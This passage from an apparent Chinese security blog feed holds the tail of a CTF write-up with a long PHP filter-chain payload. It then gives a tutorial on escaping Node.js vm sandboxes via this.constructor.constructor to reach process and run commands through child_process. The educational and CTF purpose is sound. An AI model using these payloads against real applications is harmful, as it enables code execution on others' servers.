class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.BIG5HKSCS.UTF16|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CSGB2312.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.IBM<span class="number">-1161.</span>IBM932|<span class="type">convert</span>.iconv.GB13000.UTF16BE|<span class="type">convert</span>.iconv<span class="number">.864</span>.UTF<span class="number">-32</span>LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="type">convert</span>.iconv.CP1163.CSA_T500|<span class="type">convert</span>.iconv.UCS<span class="number">-2.</span>MSCP949|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L4.UTF32|<span class="type">convert</span>.iconv.CP1250.UCS<span class="number">-2</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.UTF8.UTF16LE|<span class="type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.iconv.UTF16.EUCTW|<span class="type">convert</span>.iconv.ISO<span class="number">-8859</span><span class="number">-14.</span>UCS2|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L4.UTF32|<span class="type">convert</span>.iconv.CP1250.UCS<span class="number">-2</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.863</span>.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.ISO6937.UTF16LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.864</span>.UTF32|<span class="type">convert</span>.iconv.IBM912.NAPLPS|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.INIS.UTF16|<span class="type">convert</span>.iconv.CSIBM1133.IBM943|<span class="type">convert</span>.iconv.GBK.BIG5|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.865</span>.UTF16|<span class="type">convert</span>.iconv.CP901.ISO6937|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP-AR.UTF16|<span class="type">convert</span>.iconv<span class="number">.8859</span>_4.BIG5HKSCS|<span class="type">convert</span>.iconv.MSCP1361.UTF<span class="number">-32</span>LE|<span class="type">convert</span>.iconv.IBM932.UCS<span class="number">-2</span>BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.iconv.ISO6937<span class="number">.8859</span>_4|<span class="type">convert</span>.iconv.IBM868.UTF<span class="number">-16</span>LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L4.UTF32|<span class="type">convert</span>.iconv.CP1250.UCS<span class="number">-2</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="type">convert</span>.iconv<span class="number">.855</span>.CP936|<span class="type">convert</span>.iconv.IBM<span class="number">-932.</span>UTF<span class="number">-8</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.8859</span>_3.UTF16|<span class="type">convert</span>.iconv<span class="number">.863</span>.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP1046.UTF16|<span class="type">convert</span>.iconv.ISO6937.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP1046.UTF32|<span class="type">convert</span>.iconv.L6.UCS<span class="number">-2</span>|<span class="type">convert</span>.iconv.UTF<span class="number">-16</span>LE.T<span class="number">.61</span><span class="number">-8</span>BIT|<span class="type">convert</span>.iconv<span class="number">.865</span>.UCS<span class="number">-4</span>LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.MAC.UTF16|<span class="type">convert</span>.iconv.L8.UTF16BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CSIBM1161.UNICODE|<span class="type">convert</span>.iconv.ISO-IR<span class="number">-156.</span>JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.INIS.UTF16|<span class="type">convert</span>.iconv.CSIBM1133.IBM943|<span class="type">convert</span>.iconv.IBM932.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.base64-decode/resource=php://temp</span><br></pre></td></tr></table></figure><p>结语：java会不了一点，还是太菜，多沉淀吧</p>]]></content>
      
      
      <categories>
          
          <category> CTFwp及复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp及复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vm沙箱逃逸</title>
      <link href="/2024/04/06/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/04/06/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><p>在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。</p><h3 id="Node将字符串执行为代码"><a href="#Node将字符串执行为代码" class="headerlink" title="Node将字符串执行为代码"></a>Node将字符串执行为代码</h3><p>我们先来看两个在node中将把字符串执行成代码的方式</p><h4 id="方法一：eval"><a href="#方法一：eval" class="headerlink" title="方法一：eval"></a>方法一：eval</h4><p>我们现在当前目录创建age.txt，写入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var age <span class="operator">=</span> <span class="number">18</span></span><br></pre></td></tr></table></figure><p>然后创建1.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;age.txt&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(content)</span><br><span class="line"><span class="built_in">eval</span>(content)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age)</span><br></pre></td></tr></table></figure><p>以上代码的分析如下</p><blockquote><ol><li><code>const fs = require(&#39;fs&#39;)</code>: 导入Node.js的文件系统模块，以便读取文件内容。</li><li><code>let content = fs.readFileSync(&#39;age.txt&#39;, &#39;utf-8&#39;)</code>: 使用 <code>let</code> 关键字声明一个变量<code>content</code>，<code>readFileSync</code>是 <code>fs</code> 模块提供的同步读取文件内容的函数。它接受两个参数：第一个表示要读取的文件路径，第二个表示文件的编码格式</li><li><code>content``console.log(content)</code>: 将文件内容输出到控制台，用于调试目的。</li><li><code>eval(content)</code>: 使用 <code>eval()</code> 函数执行文件内容，即执行其中的JavaScript代码。<code>eval()</code> 函数将字符串作为JavaScript代码执行。</li><li><code>console.log(age)</code>: 输出变量 <code>age</code> 的值到控制台。这假设文件中的JavaScript代码定义了一个变量 <code>age</code></li></ol></blockquote><p>最后输出18</p><p>如果当前作用域下有相同变量名，会发生什么，我们修改代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;age.txt&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> age= <span class="number">20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(content)</span><br><span class="line"><span class="built_in">eval</span>(content)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age)</span><br></pre></td></tr></table></figure><p>结果是出现报错</p><p><img src="/img/image-20240329195706379.png" alt="image-20240329195706379"></p><p>在js中每一个模块都有自己独立的作用域，所以用eval执行字符串代码很容易出现上面的这个问题</p><h4 id="方法二：new-Function"><a href="#方法二：new-Function" class="headerlink" title="方法二：new Function"></a>方法二：new Function</h4><p>方法一由于不同模块作用域被限制了使用，那我们可以自己创造作用域来正常使用；new Function的第一个参数是形参名称，第二个参数是函数体。</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let age= <span class="number">20</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">add</span> = <span class="keyword">new</span> <span class="keyword">Function</span><span class="params">(<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;return age+1&#x27;</span>)</span></span><br><span class="line"><span class="title function_">console</span>.<span class="title function_">log</span><span class="params">(<span class="keyword">add</span>(age)</span>)</span><br></pre></td></tr></table></figure><p>以上代码分析</p><blockquote><p>这段代码首先声明了一个变量 age，其值为 20。然后使用了 new Function 构造函数创建了一个新的函数 add，该函数接受一个参数 age，并返回 age + 1 的结果。最后，调用这个函数，并将 age 变量作为参数传递给它，打印出返回的结果。</p></blockquote><p>函数内和函数外是两个作用域，当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，当参数过多时这种方法就显的麻烦</p><p>以上例子可以看出来其实我们的思想就是如何创建一个能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域，这也就是vm模块的作用。</p><h3 id="Nodejs作用域"><a href="#Nodejs作用域" class="headerlink" title="Nodejs作用域"></a>Nodejs作用域</h3><p>在Node中一般把作用域叫上下文</p><p>我们在写一个Node项目时往往要在一个文件里ruquire其他的js文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的上下文，包之间的作用域是互相隔离不互通的，也就是说就算我在1.js中require了2.js，那么我在1.js中也无法直接调用2.js中的变量和函数，例如在同一级目录下，有1.js和2.js两个文件</p><p>1.js</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var age <span class="operator">=</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><p>2.js</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const <span class="keyword">a</span> = <span class="built_in">require</span>(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line">console.<span class="built_in">log</span>(<span class="keyword">a</span>.age)</span><br></pre></td></tr></table></figure><p> 因为此时age已经挂载在global上了，它的作用域已经不在1中了</p><h3 id="vm沙箱逃逸-1"><a href="#vm沙箱逃逸-1" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h3><blockquote><p>想要实现沙箱的隔离作用，我们可以创建一个新的作用域，让代码在这个新的作用域里面去运行，这样就和其他的作用域进行了隔离，这也就是vm模块运行的原理，先来了解几个常用的vm模块的API。</p></blockquote><ul><li>vm.runinThisContext(code)：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</li></ul><p><img src="/img/image-20240330162744047.png" alt="image-20240330162744047"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> localVar = <span class="string">&#x27;initial value&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vmResult = vm.<span class="title function_">runInThisContext</span>(<span class="string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;vmResult:&#x27;</span>, vmResult);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;localVar:&#x27;</span>, localVar);</span><br><span class="line"><span class="comment">// vmResult: &#x27;vm&#x27;, localVar: &#x27;initial value&#x27;</span></span><br></pre></td></tr></table></figure><p>最后输出</p><p><img src="/img/image-20240330165024084.png" alt="image-20240330165024084"></p><p>以上代码解析</p><blockquote><ol><li>首先，使用 <code>require(&#39;vm&#39;)</code> 导入了 Node.js 的 <code>vm</code> 模块，该模块提供了虚拟机功能。</li><li>定义了一个变量 <code>localVar</code> 并初始化为 <code>&#39;initial value&#39;</code>。</li><li>使用 <code>vm.runInThisContext()</code> 方法在当前的上下文中执行了一段 JavaScript 代码 <code>&#39;localVar = &quot;vm&quot;;&#39;</code>。这段代码将变量 <code>localVar</code> 的值设置为 <code>&#39;vm&#39;</code>。这个方法的作用是在当前上下文中执行一段 JavaScript 代码字符串。</li><li>输出了执行结果 <code>vmResult</code> 和变量 <code>localVar</code> 的值。<code>vmResult</code> 的值是执行 <code>vm.runInThisContext()</code> 方法后的返回值，这里是执行的代码字符串本身，即 <code>&#39;vm&#39;</code>。<code>localVar</code> 的值仍然是初始值 <code>&#39;initial value&#39;</code>，因为虽然在虚拟机环境中改变了变量的值，但是并没有影响到外部作用域的变量值。</li></ol><p>简单来说就是<code>vm.runInThisContext()</code> 方法创造了一个sandbox，并在沙箱中将global作用域中的localVar的值改为vm，但是global作用域中的的localVar值没有影响。</p></blockquote><ul><li><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</li></ul><p><img src="/img/20221118183946-521c54fa-672d-1.png"></p><ul><li><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line">  <span class="variable language_">global</span>.<span class="property">globalVar</span> = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">const</span> sandbox = &#123; <span class="attr">globalVar</span>: <span class="number">1</span> &#125;;</span><br><span class="line">  vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">  vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox)); <span class="comment">// &#123; globalVar: 2 &#125;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(globalVar)); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>以上代码解析：</p><blockquote><ol><li>引入 <code>util</code> 和 <code>vm</code> 模块：<code>const util = require(&#39;util&#39;);</code> 和 <code>const vm = require(&#39;vm&#39;);</code>，用于后续的对象输出和创建沙盒环境。</li><li>定义全局变量 <code>globalVar</code>，并赋值为 <code>3</code>。</li><li>创建沙盒环境：<code>const sandbox = &#123; globalVar: 1 &#125;;</code>，这里定义了一个包含 <code>globalVar</code> 属性的对象，初始值为 <code>1</code>。</li><li>使用 <code>vm.createContext(sandbox);</code> 方法创建沙盒环境，将其作为参数传入，表示在该沙盒环境中执行后续的 JavaScript 代码。</li><li>使用 <code>vm.runInContext(&#39;globalVar *= 2;&#39;, sandbox);</code> 方法在沙盒环境中执行一段 JavaScript 代码，将 <code>globalVar</code> 的值乘以 <code>2</code>。</li><li>使用 <code>util.inspect(sandbox)</code> 方法将沙盒环境对象转换为字符串并输出，结果为 <code>&#123; globalVar: 2 &#125;</code>，表明沙盒环境中 <code>globalVar</code> 的值已经被修改为 <code>2</code>。</li><li>使用 <code>util.inspect(globalVar)</code> 方法输出全局变量 <code>globalVar</code> 的值，结果为 <code>3</code>，表明全局变量 <code>globalVar</code> 的值没有受到沙盒环境中代码的影响。</li></ol></blockquote><p>创建的这个sandbox沙箱对象无法访问global属性，所以值仍为3</p><ul><li><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</li><li><code>vm.Script类</code> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</li><li><code>new vm.Script(code, options)</code>：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。<br>code：要被解析的JavaScript代码</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line"><span class="attr">animal</span>: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line"><span class="attr">count</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox));</span><br><span class="line"><span class="comment">// &#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span></span><br></pre></td></tr></table></figure><p>以上代码解析：</p><blockquote><ol><li>引入 <code>util</code> 和 <code>vm</code> 模块：<code>const util = require(&#39;util&#39;);</code> 和 <code>const vm = require(&#39;vm&#39;);</code>，用于后续的对象输出和创建沙盒环境。</li><li>定义了一个包含两个属性的沙盒环境对象 <code>sandbox</code>，其中包含 <code>animal</code> 属性为 <code>&#39;cat&#39;</code>，<code>count</code> 属性为 <code>2</code>。</li><li>使用 <code>vm.Script</code> 类创建了一个 JavaScript 脚本对象 <code>script</code>，该脚本包含了一段 JavaScript 代码 <code>&#39;count += 1; name = &quot;kitty&quot;;&#39;</code>，用于对 <code>count</code> 属性进行增加操作，并给 <code>name</code> 属性赋值为 <code>&#39;kitty&#39;</code>。</li><li>使用 <code>vm.createContext</code> 方法创建了一个沙盒环境的上下文 <code>context</code>，将 <code>sandbox</code> 对象作为参数传入，表示在该沙盒环境中执行后续的 JavaScript 代码。</li><li>使用 <code>script.runInContext(context);</code> 方法在沙盒环境中运行之前定义的 JavaScript 脚本对象，即执行 <code>count += 1; name = &quot;kitty&quot;;</code> 这段代码。</li><li>使用 <code>util.inspect(sandbox)</code> 方法将沙盒环境对象转换为字符串并输出，结果为 <code>&#123; animal: &#39;cat&#39;, count: 3, name: &#39;kitty&#39; &#125;</code>，表明沙盒环境中 <code>count</code> 属性的值已经增加为 <code>3</code>，并且 <code>name</code> 属性的值也被修改为 <code>&#39;kitty&#39;</code>。</li></ol></blockquote><p>script对象可以通过runInXXXContext运行。</p><p>我们一般进行沙箱逃逸最后都是进行rce，那么在Node里要进行rce就需要procces了，在获取到process对象后我们就可以用require来导入child_process，再利用child_process执行命令。但process挂载在global上，但是我们上面说了在<code>creatContext</code>后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</p><p>如果我们把代码改成这样（code参数最好用反引号包裹，这样可以使code更严格便于执行）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process.env&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1);</span><br></pre></td></tr></table></figure><p>上述代码解析：</p><blockquote><ol><li><code>&quot;use strict&quot;;</code>：这是 JavaScript 的严格模式声明，它使得在代码中采用一些不安全的语法和行为会引发错误，从而提高代码的健壮性和可维护性。</li><li><code>const vm = require(&quot;vm&quot;);</code>：引入 Node.js 的 <code>vm</code> 模块，用于创建沙盒环境。</li><li><code>vm.runInNewContext(code, sandbox)</code>：<code>runInNewContext</code> 方法是 <code>vm</code> 模块中的一个函数，用于在一个新的沙盒环境中执行指定的 JavaScript 代码 <code>code</code>。这里的 <code>code</code> 是一个字符串，表示要执行的 JavaScript 代码。<code>sandbox</code> 参数是一个对象，表示沙盒环境的上下文，可以在执行代码时使用。在本例中，将环境变量获取的代码作为字符串传入 <code>runInNewContext</code> 方法中。</li><li><code>this.constructor.constructor(&#39;return process.env&#39;)()</code>：这段代码利用了 JavaScript 中的一种特性——利用构造函数的构造函数来获取当前进程的环境变量。具体来说，<code>this.constructor</code> 表示当前的构造函数（<code>Object</code>），而 <code>this.constructor.constructor</code> 表示 <code>Object</code> 构造函数的构造函数（<code>Function</code>）。然后，通过调用 <code>Function</code> 构造函数，传入字符串 <code>&#39;return process.env&#39;</code>，来创建一个新的函数，该函数的作用是返回当前进程的环境变量。最后，通过 <code>()</code> 运算符调用这个新创建的函数，即执行获取环境变量的操作。</li><li><code>console.log(y1);</code>：输出获取到的环境变量。</li></ol></blockquote><p>最后输出</p><p><img src="/img/image-20240330172508221.png" alt="image-20240330172508221"></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.runInNewContext(`<span class="language-javascript"><span class="variable language_">this</span>.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process.env&#x27;</span></span>)(<span class="params"></span>)</span>`);</span><br></pre></td></tr></table></figure><p>那么我们是怎么实现逃逸的呢，首先这里面的this指向的是当前传递给<code>runInNewContext</code>的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p><p>下面这行代码也可以达到相同的效果：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const y1 = vm.runInNewContext(`<span class="language-javascript"><span class="variable language_">this</span>.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>)(<span class="params"></span>)</span>`);</span><br></pre></td></tr></table></figure><p><code>this.toString.constructor</code> 表示当前环境下 <code>Function</code> 对象的构造函数，即 <code>Function</code> 构造函数。但<code>Function</code> 构造函数需要一个函数体作为参数，而不是一个简单的字符串。因此，代码将无法成功执行。</p><p>所以我们还需要通过对返回的process对象赋值来rce了</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y1<span class="selector-class">.mainModule</span><span class="selector-class">.require</span>(<span class="string">&#x27;child_process&#x27;</span>)<span class="selector-class">.execSync</span>(<span class="string">&#x27;whoami&#x27;</span>)<span class="selector-class">.toString</span>()</span><br></pre></td></tr></table></figure><p>上串代码尝试使用 <code>y1</code> 对象的 <code>mainModule.require()</code> 方法来获取 <code>child_process</code> 模块，并调用 <code>execSync()</code> 方法来执行命令 <code>whoami</code>，并将结果转换为字符串返回。</p><p>有一个问题，下段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="string">`m + n`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123; <span class="attr">m</span>: <span class="number">1</span>, <span class="attr">n</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br></pre></td></tr></table></figure><p>我们能不能把<code>this.toString.constructor(&#39;return process&#39;)()</code>中的this换成{}呢？ {}的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到global下的。</p><p>如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用。</p><p>我们将mn改成其他类型就可以利用了：</p><p><img src="/img/20221118184151-9c9bb228-672d-1.png" alt="20221118184151-9c9bb228-672d-1"></p><h3 id="vm沙箱逃逸的一些其他情况"><a href="#vm沙箱逃逸的一些其他情况" class="headerlink" 